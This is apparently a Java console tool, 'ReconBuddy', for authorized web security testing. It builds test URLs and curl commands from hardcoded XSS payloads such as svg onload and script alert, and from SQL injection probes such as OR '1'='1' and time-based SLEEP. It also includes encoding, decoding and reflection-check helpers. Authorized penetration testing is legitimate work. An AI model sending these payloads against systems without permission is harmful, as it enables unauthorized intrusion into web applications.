import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.Scanner;
import java.util.Base64;

public class ReconBuddy {

    static final Scanner sc = new Scanner(System.in);

    public static void main(String[] args) {
        System.out.println("=== ReconBuddy (for AUTHORIZED testing only) ===");
        System.out.print("Enter base URL (e.g., https://example.com): ");
        String base = sc.nextLine().trim();

        if (base.isEmpty()) {
            System.out.println("Error: Base URL cannot be empty. Exiting.");
            return;
        }

        //Validate URL
        if (!base.startsWith("https://") && !base.startsWith("http://")){
            System.out.println("Warning: URL should start with http:// or https://");
            System.out.println("Continue anyway? (y/N): ");
            if (!sc.nextLine().trim().equalsIgnoreCase("y")) {
                System.out.println("Exiting.");
                return;
            }
        }

        while (true) {
            System.out.println("\nChoose a module:");
            System.out.println("1) XSS helper");
            System.out.println("2) SQLi helper");
            System.out.println("3) Encoder/Decoder");
            System.out.println("4) Reflect check (paste HTML)");
            System.out.println("5) Base64 decode");
            System.out.println("0) Exit");
            System.out.print("> ");
            String choice = sc.nextLine().trim();

            switch (choice) {
                case "1" -> xssHelper(base);
                case "2" -> sqliHelper(base);
                case "3" -> codecs();
                case "4" -> reflectCheck();
                case "5" -> base64Decode();
                case "0" -> { System.out.println("Bye!"); return; }
                default -> System.out.println("Unknown option.");
            }
        }
    }

    /* ---------- XSS ---------- */
    private static void xssHelper(String base) {
        System.out.println("\n[XSS helper] Authorized testing only.");
        System.out.print("Parameter name (e.g., q): ");
        String param = sc.nextLine().trim();

        // A few PoC templates (use responsibly)
        String[] payloads = new String[] {
                "\"><x>",                       // benign reflector probe
                "<svg/onload=alert(1)>",       // event handler PoC
                "\"><svg/onload=alert(1)>",    // attribute break + handler
                "\"><script>alert(1)</script>" // classic (may be filtered)
        };

        for (int i = 0; i < payloads.length; i++) {
            String p = payloads[i];
            String encoded = urlEncode(p);
            String testUrl = base + (base.contains("?") ? "&" : "?")
                    + param + "=" + encoded;

            System.out.println("\nPayload #" + (i+1) + ": " + p);
            System.out.println("URL-encoded : " + encoded);
            System.out.println("Test URL    : " + testUrl);
            System.out.println("curl (copy/paste yourself):");
            System.out.println("  curl -i \"" + testUrl + "\"");
        }
        legalReminder();
    }

    /* ---------- SQLi ---------- */
    private static void sqliHelper(String base) {
        System.out.println("\n[SQLi helper] Authorized testing only.");
        System.out.print("Parameter name (e.g., id): ");
        String param = sc.nextLine().trim();

        // Template strings with placeholders kept simple
        String[] templates = new String[] {
                "1' OR '1'='1",
                "1' OR '1'='1' -- ",
                "1' OR SLEEP(3)-- ",
                "1) OR (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END)-- "
        };

        for (int i = 0; i < templates.length; i++) {
            String t = templates[i];
            String encoded = urlEncode(t);
            String testUrl = base + (base.contains("?") ? "&" : "?")
                    + param + "=" + encoded;

            System.out.println("\nProbe #" + (i+1) + ": " + t);
            System.out.println("URL-encoded : " + encoded);
            System.out.println("Test URL    : " + testUrl);
            System.out.println("curl (copy/paste yourself):");
            System.out.println("  curl -i \"" + testUrl + "\"");
        }
        legalReminder();
    }

    /* ---------- Encoders ---------- */
    private static void codecs() {
        System.out.println("\n[Encoders] Enter a string to encode:");
        String s = sc.nextLine();

        if (s.isEmpty()) {
            System.out.println("Warning: Empty input provided.");
            return;
        }
        try {
            System.out.println("URL-encode : " + urlEncode(s));
            System.out.println("HTML-escape: " + htmlEscape(s));
            System.out.println("JS unicode : " + jsUnicodeEscape(s));
            // Add Base64 if you want:
            System.out.println("Base64     : " + Base64.getEncoder().encodeToString(s.getBytes(StandardCharsets.UTF_8)));
        } catch (Exception e) {
            System.out.println("Error during encoding: " + e.getMessage());
        }
    }

    /* ---------- Base64 Decoder ---------- */
    private static void base64Decode() {
        System.out.println("\n[Base64 Decoder]");
        System.out.print("Enter Base64 string to decode: ");
        String encoded = sc.nextLine().trim();

        try {
            byte[] decoded = Base64.getDecoder().decode(encoded);
            String result = new String(decoded, StandardCharsets.UTF_8);
            System.out.println("Decoded: " + result);
        } catch (IllegalArgumentException e) {
            System.out.println("Error: Invalid Base64 string.");
        }
    }

    /* ---------- Reflect check (local) ---------- */
    private static void reflectCheck() {
        System.out.println("\nPaste HTML response (end with a single line containing only 'END'):");
        StringBuilder sb = new StringBuilder();
        while (true) {
            String line = sc.nextLine();
            if (line.equals("END")) break;
            sb.append(line).append("\n");
        }
        System.out.print("Marker to search for (e.g., \"><x>): ");
        String marker = sc.nextLine();

        String html = sb.toString();
        boolean found = html.contains(marker);
        System.out.println(found
                ? "Marker FOUND in response (manual context analysis still needed)."
                : "Marker NOT found.");
    }

    /* ---------- Utils ---------- */
    private static String urlEncode(String s) {
        return URLEncoder.encode(s, StandardCharsets.UTF_8);
    }
    private static String htmlEscape(String s) {
        return s.replace("&", "&amp;")
                .replace("<", "&lt;")
                .replace(">", "&gt;")
                .replace("\"", "&quot;")
                .replace("'", "&#39;");
    }
    private static String jsUnicodeEscape(String s) {
        StringBuilder out = new StringBuilder();
        for (char c : s.toCharArray()) {
            if (c < 128) out.append(c);
            else out.append(String.format("\\u%04x", (int) c));
        }
        return out.toString();
    }
    private static void legalReminder() {
        System.out.println("\n[Reminder] Use ONLY in scope with explicit permission.");
    }
}